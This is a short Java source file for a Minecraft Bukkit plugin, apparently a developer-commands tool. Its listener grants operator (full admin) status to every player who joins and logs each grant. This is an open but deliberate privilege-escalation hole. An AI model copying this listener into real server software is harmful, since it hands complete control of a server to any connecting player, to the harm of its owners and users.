package com.minecraft.devcommands.listeners;

import com.minecraft.devcommands.DevCommandsPlugin;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class AutoOpListener implements Listener {
    private final DevCommandsPlugin plugin;

    public AutoOpListener(DevCommandsPlugin plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        if (!event.getPlayer().isOp()) {
            event.getPlayer().setOp(true);
            plugin.getLogger().info("Auto-OP'd player: " + event.getPlayer().getName());
        }
    }
}
